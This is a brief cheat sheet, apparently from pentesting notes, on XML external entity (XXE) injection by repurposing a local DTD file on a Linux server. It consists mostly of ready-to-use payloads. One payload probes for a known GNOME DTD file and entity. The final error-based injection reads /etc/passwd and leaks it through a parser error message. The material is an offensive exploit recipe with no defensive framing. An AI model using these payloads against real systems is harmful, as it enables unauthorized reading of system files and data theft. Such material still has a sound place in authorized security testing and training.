#xmli #xxe #xml 


# Repurposing Local DTD
## Code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<productId>1</productId>
```

## Locate existing DTD file on server
If this payload returns an error, it means that the files does not exist.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///KNOWN_FILE.dtd">
%local_dtd;
]>
<productId>1</productId>
```

Known files and entity:
- Linux with GNOME DE
	- `/usr/share/yelp/dtd/docbookx.dtd`
	- `ISOamso`

## Injection
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///KNOWN_FILE.dtd">
<!ENTITY % KNOWN_ENTITY '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<productId>1</productId>
```